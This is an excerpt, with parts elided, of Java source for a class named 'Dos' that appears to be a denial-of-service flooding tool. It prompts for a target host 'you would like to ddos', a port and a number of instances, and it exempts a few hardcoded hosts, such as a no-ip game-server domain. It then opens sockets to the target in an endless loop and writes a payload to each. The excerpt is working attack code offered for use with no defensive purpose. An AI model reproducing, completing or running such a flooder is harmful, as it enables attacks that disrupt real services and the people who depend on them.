...
public class Dos extends Socket implements Runnable {
  ...
  public static void main(String args[]) {
    System.out.println(
      "Please input the IP/Domain of the target you would like to ddos :::"
    );
    int retry1 = 0;
    while (retry1 == 0) {
      try {
        ...
        if (
          target.contains("maplerevolution.no-ip.biz") ||
          target.contains("69.162.75.70") ||
          target.contains("127.0.0.1") ||
          target.contains("127.0.0.1") ||
          target.contains("127.0.0.1") ||
          target.contains("leaderms.com.br")
        ) {
          retry1 = 0;
    ...
    System.out.println(
      "Please input the port of the target you would like to ddos [Default = 80"
    );
    int retry2 = 0;
    while (retry2 == 0) {
      try {
    ...
    System.out.println(
      "Please input the number of instance you would like to create :::"
    );
    int retry3 = 0;
    int times = 0;
    while (retry3 == 0) {
    ...
    while (true) {
      try {
        ...
        final BufferedWriter out = new BufferedWriter(
          new OutputStreamWriter(new Socket(target, port).getOutputStream())
        );
        out.write(tosend);
        out.flush();
